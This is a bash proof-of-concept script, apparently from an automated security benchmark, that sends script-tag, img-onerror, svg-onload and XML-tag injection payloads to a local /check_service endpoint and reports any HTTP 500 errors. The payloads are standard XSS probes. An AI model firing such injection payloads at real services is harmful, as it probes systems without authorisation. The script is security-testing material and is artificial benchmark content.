#!/bin/bash
# POC: Demonstrates HTML/XML tag injection in /check_service endpoint causing HTTP 500 errors and information disclosure about backend service checking logic
# Target: ./repo
# Created: 2025-11-07T17:25:16.975Z
# Session: benchmark-XBEN-068-24-mhp49w3p

# HTML Tag Injection POC for /check_service endpoint
# Demonstrates how HTML/XML tags bypass input validation and trigger HTTP 500 errors

TARGET_URL="${1:-http://localhost:5000/check_service}"
echo "[*] HTML Tag Injection POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Baseline - valid service name (should return 200)
echo "[TEST 1] Baseline: Valid service name"
echo "Payload: {\"service_name\": \"apache\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "apache"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"
echo ""

# Test 2: Script tag injection
echo "[TEST 2] Script tag injection"
echo "Payload: {\"service_name\": \"<script>alert('xss')</script>\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "<script>alert('\''xss'\'')</script>"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "[+] HTML tag bypass confirmed - HTTP 500 error triggered"
fi
echo ""

# Test 3: Image tag with onerror
echo "[TEST 3] Image tag with onerror handler"
echo "Payload: {\"service_name\": \"<img src=x onerror=alert(1)>\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "<img src=x onerror=alert(1)>"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "[+] HTML tag bypass confirmed - HTTP 500 error triggered"
fi
echo ""

# Test 4: SVG tag with onload
echo "[TEST 4] SVG tag with onload handler"
echo "Payload: {\"service_name\": \"<svg onload=alert(1)>\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "<svg onload=alert(1)>"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "[+] HTML tag bypass confirmed - HTTP 500 error triggered"
fi
echo ""

# Test 5: XML/Entity injection
echo "[TEST 5] XML entity injection"
echo "Payload: {\"service_name\": \"<entity value=\\\"test\\\">\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "<entity value=\"test\">"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "[+] XML tag bypass confirmed - HTTP 500 error triggered"
fi
echo ""

echo "[*] POC Summary:"
echo "- HTML/XML tags bypass input validation and trigger HTTP 500 errors"
echo "- This indicates the backend attempts to parse or process the input differently"
echo "- Error messages may reveal information about internal system behavior"